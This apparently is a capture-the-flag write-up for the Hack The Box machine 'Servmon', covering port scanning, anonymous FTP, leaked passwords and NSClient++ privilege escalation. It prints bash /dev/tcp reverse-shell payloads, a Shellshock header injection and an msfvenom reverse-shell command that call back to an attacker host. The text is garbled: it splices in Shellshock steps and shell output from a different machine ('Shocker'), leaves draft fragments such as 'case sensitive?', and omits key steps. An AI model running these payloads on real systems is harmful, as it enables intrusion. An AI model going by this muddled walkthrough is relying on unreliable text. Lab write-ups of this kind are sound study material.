# Servmon - hackthebox

![servmon badge](images/servmon/servmonbadge.jpg)

Servmon is a Windows machine rated Easy on HTB.

## Port Scan

`nmap -sC -sV -p- 10.10.10.184`

```
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
<SNIP<>>
80/tcp    open  http          syn-ack ttl 127
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
5040/tcp  open  unknown       syn-ack ttl 127
5666/tcp  open  tcpwrapped    syn-ack ttl 127
6063/tcp  open  tcpwrapped    syn-ack ttl 127
6699/tcp  open  napster?      syn-ack ttl 127
7680/tcp  open  pando-pub?    syn-ack ttl 127
8443/tcp  open  ssl/https-alt syn-ack ttl 127
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03 0c40 5b7a 0f6d d8c8 78e3 cba7 38b4
| SHA-1: 7083 bd82 b4b0 f9c0 cc9c 5019 2f9f 9291 4694 8334
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
<SNIP>
```

There are many ports open. FTP allows anonymous access so let's start with this low-hanging fruit.

## Enumerating FTP

Connect with to FTP with this command.

`ftp 10.10.10.184`

```
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
```

Now, other than getting two usernames, we also know the file path to Nathan's password file. Let's hope it's still there when we get to it.

## Exploiting NVMS Directory Traversal

![bug](images/shocker/dontbugme.jpg)

Now, we have the passwords from Nathan's password file.

## Bruteforcing SSH

Let's consolidate the usernames and passwords we've gathered up to this point.

In `user.txt`:

```
nadine
nathan
```

In `password.txt`:

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

We can use these information to bruteforce the SSH service with hydra.
case sensitive?

```
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine
```

Here, you can find the user flag.

## Privilege Escalation Through NSClient++ Vulnerability

First, let's setup a listener for catching our reverse shell.

`nc -nvlp 8888`

Then, send another request for user.sh with the header value modified as:

`() { :;}; /bin/bash -i >& /dev/tcp/10.10.X.X/8888 0>&1`

This will get a bash reverse shell, which is the natural choice here as bash is available. Note that `echo;` is not needed here because we are not interested in the HTML response.

### Getting WebUI Password

```
root@kali:~# nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.10.56] 58462
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ cd ~
cd ~
shelly@Shocker:/home/shelly$ ls
ls
user.txt
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
```
Try to access

### Checking Configuration

[Fantastic but more technical explanation here](https://hypothetical.me/post/reverse-shell-in-bash/)

`/bin/bash -i >& /dev/tcp/10.10.X.X/8888 0>&1`

* `/bin/bash` - getting a new bash session

Show can curl locally

### Exploiting With API

Prepare a batch file payload with msfvenom.

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8888 -f bat > payload.bat`

## Privilege Escalation

After executing the script, we get a system shell.

```
root@kali:~# nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.184] 49694
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system
```

# Ending Thoughts

I got to try out local port forwarding with this box. However, you don't need it if you're exploiting via the API.

**References**

* https://www.netsparker.com/blog/web-security/cve-2014-6271-shellshock-bash-vulnerability-scan/
* https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability
* https://resources.infosecinstitute.com/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/#gref
* https://blog.knapsy.com/blog/2014/10/07/basic-shellshock-exploitation/
* https://github.com/opsxcq/exploit-CVE-2014-6271
